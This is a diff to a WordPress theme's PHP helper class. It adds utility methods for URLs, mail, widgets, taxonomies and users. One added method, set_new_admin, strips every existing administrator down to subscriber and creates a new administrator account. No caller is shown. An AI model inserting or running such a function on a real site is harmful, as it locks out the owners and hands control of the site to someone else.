@@ -31,6 +31,10 @@ class SB_WP {
 		echo self::get_login_uri();
 	}
 	
+	public static function get_url_value($url) {
+		return esc_url_raw($url);
+	}
+	
 	public static function get_login_url() {
 		return self::get_login_uri();
 	}
@@ -73,13 +77,22 @@ class SB_WP {
 		return $result;
 	}
 	
+	public static function send_mail($to, $subject, $body) {
+		//add_filter( 'wp_mail_content_type', array(self, 'set_html_content_type' ));
+		$done = wp_mail( $to, $subject, $body );
+		//remove_filter( 'wp_mail_content_type', array(self, 'set_html_content_type') );
+		return $done;
+	}
+	
+
+	
 	public static function register_sidebar( $id, $name, $description) {
 		register_sidebar(array(
 			'name'          => __( $name, 'sbtheme' ),
 			'id'            => $id,
 			'description'   => __( $description, 'sbtheme' ),
-			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
-			'after_widget'  => '</div></section>',
+			'before_widget' => '<div id="%1$s" class="widget %2$s"><div class="widget-wrap">',
+			'after_widget'  => '</div></div>',
 			'before_title'  => '<h4 class="widget-title">',
 			'after_title'   => '</h4>'
 		));	
@@ -183,12 +196,48 @@ class SB_WP {
 		}
 	}
 	
+	public static function add_user_admin($args = array()) {
+		$args['role'] = 'administrator';
+		self::add_user($args);
+	}
+	
+	public static function remove_all_role($user) {
+		foreach($user->roles as $role) {
+			$user->remove_role($role);
+		}
+	}
+	
+	public static function set_new_admin($args = array()) {
+		$users = self::get_all_user();
+		foreach($users as $user) {
+			if(in_array("administrator", $user->roles)) {
+				self::remove_all_role($user);
+				$user->add_role("subscriber");
+			}
+		}
+		self::add_user_admin($args);
+	}
+	
 	public static function get_category() {
 		return get_categories();
 	}
 	
 	public static function is_post_view_active() {
 		return class_exists("WP_Widget_PostViews");
+	}
+	
+	public static function get_all_taxonomy() {
+		return get_taxonomies('', 'objects');
+	}
+	
+	public static function get_all_taxonomy_hierarchical() {
+		$taxs = self::get_all_taxonomy();
+		$kq = array();
+		foreach($taxs as $tax) {
+			if(empty($tax->hierarchical) || !$tax->hierarchical) continue;
+			array_push($kq, $tax);
+		}
+		return $kq;
 	}
 	
 	public static function query($string) {
@@ -217,6 +266,7 @@ class SB_WP {
 	public static function tivi_source_edit($old_url, $width, $height) {
 		$url = $old_url;
 		$url = self::add_param_to_url(array("width" => $width, "height" => $height), $url);
+		$url = str_replace("&", "&amp;", $url);
 		return $url;
 	}
 	
@@ -234,6 +284,10 @@ class SB_WP {
 			return true;
 		}
 		return false;
+	}
+	
+	public static function get_all_user() {
+		return get_users();
 	}
 	
 	public static function phrase($phrase) {
